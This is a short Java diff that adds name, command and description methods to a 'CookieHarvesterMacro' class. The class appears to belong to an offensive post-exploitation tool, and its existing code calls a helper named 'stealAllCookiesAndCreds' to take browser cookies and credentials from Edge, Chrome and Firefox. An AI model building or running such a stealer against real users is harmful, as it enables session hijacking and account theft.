@@ -18,4 +18,19 @@ public class CookieHarvesterMacro extends AbstractCommandMacro {
 		return CookiesCommandHelper.stealAllCookiesAndCreds(io, sessionId, harvestProcessor);
 	}
 
+	@Override
+	public String getReadableName() {
+		return "Browser Cookie Harvester";
+	}
+
+	@Override
+	public String getInvocationCommandDescription() {
+		return HARVEST_COOKIES_CMD;
+	}
+
+	@Override
+	public String getBehaviorDescription() {
+		return "This macro harvests available browser cookies for Edge, Chrome, and Firefox";
+	}
+
 }
